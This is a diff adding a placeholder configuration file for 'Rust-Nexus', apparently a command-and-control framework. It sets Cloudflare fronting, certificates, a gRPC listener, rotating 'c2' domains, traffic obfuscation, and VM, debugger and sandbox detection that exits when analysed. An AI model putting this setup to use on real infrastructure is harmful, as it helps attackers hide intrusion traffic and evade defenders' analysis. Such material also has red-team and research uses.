@@ -1,0 +1,69 @@
+# Rust-Nexus Working Configuration
+# Corrected configuration that matches the expected schema
+
+[cloudflare]
+api_token = "YOUR_CLOUDFLARE_API_TOKEN_HERE"
+zone_id = "YOUR_CLOUDFLARE_ZONE_ID_HERE"
+domain = "your-domain.com"
+proxy_enabled = true
+ttl = 300
+geographic_regions = ["US", "EU", "APAC"]
+
+# Custom headers must be a proper HashMap
+[cloudflare.custom_headers]
+
+[letsencrypt]
+contact_email = "your-email@example.com"
+challenge_type = "Dns01"
+cert_renewal_days = 30
+wildcard_enabled = true
+acme_directory_url = "https://acme-v02.api.letsencrypt.org/directory"
+cert_storage_dir = "./certs"
+
+[origin_cert]
+cert_path = "./certs/server.crt"
+key_path = "./certs/server.key"
+ca_cert_path = "./certs/server-ca.crt"
+pin_validation = true
+validity_days = 365
+
+[grpc_server]
+bind_address = "0.0.0.0"
+port = 8443
+mutual_tls = false
+max_connections = 1000
+connection_timeout = 30
+keepalive_interval = 60
+max_message_size = 16777216
+
+[domains]
+primary_domains = [
+    "c2.your-domain.com",
+    "api.your-domain.com"
+]
+backup_domains = [
+    "backup.your-domain.com",
+    "cdn.your-domain.com"
+]
+rotation_interval = 24
+max_subdomains = 10
+health_monitoring = true
+dns_timeout = 5
+
+# Subdomain pattern as enum variant
+subdomain_pattern = { Random = { length = 8 } }
+
+[security]
+additional_encryption = true
+traffic_obfuscation = true
+
+[security.anti_analysis]
+vm_detection = true
+debugger_detection = true
+sandbox_detection = true
+detection_action = "Exit"
+
+[security.rate_limiting]
+max_requests_per_minute = 60
+burst_size = 10
+per_ip_limiting = true
